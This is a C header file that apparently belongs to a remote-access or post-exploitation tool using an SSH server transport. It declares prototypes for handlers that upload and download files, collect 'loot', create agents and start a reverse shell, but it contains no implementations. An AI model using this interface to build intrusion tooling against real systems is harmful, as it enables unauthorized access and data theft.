#pragma once

#include "../transport.h"
#include "../typedefs.h"
#include "../b64.h"
#include "../common.h"
#include "../execs.h"
#include "../misc.h"
#include "../authenticate.h"
#include "../agents.h"

#include <libssh/libssh.h>
#include <libssh/server.h>

#ifndef KEYS_FOLDER
#ifdef _WIN32
#define KEYS_FOLDER
#else
#define KEYS_FOLDER "/etc/ssh/"
#endif
#endif


    
int authenticate();
int init(pClientDat dat);
int end();

// generic protocol handlers
int send_ok();
int send_err();
int listen();
int read(char **buff, int length);
int write(char *buff, int length);
    
int determine_handler();
int upload_file(char *ptr, int is_module);
int download_file(char *ptr, int is_manager, char *extra);
int get_loot(char *loot);
int get_info(char *ptr);

void make_agent(char *dat_ptr, char *d_ptr);
int init_reverse_shell(char *id);

pClientDat get_data();
char* get_name();    
int get_id();